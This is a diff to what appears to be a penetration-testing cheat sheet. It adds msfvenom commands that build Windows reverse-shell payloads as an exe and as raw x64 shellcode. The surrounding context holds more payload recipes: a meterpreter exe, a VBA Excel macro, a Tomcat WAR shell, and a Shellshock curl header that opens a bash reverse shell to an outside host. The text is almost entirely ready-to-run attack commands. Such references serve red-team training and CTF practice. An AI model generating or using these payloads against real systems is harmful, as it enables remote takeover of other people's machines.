@@ -148,8 +148,12 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR IP>/<PORT> 0>&1' 
 
 ## MSFVenom:
 ```bash
+# Simple Windows Reverse Shell
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=2225 -f exe > ms17–010.exe
 # Windows Rev shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=55 -f exe  > rev.exe
+# Raw Windows Rev Shell
+msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=192.168.0.29 --platform windows -a x64 --format raw -o sc_x64_payload.bin
 # Excel macro using VBA
 msfvenom -p windows/meterpreter/reverse\_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba
 # WAR Rev Shell for Apache Tomcat
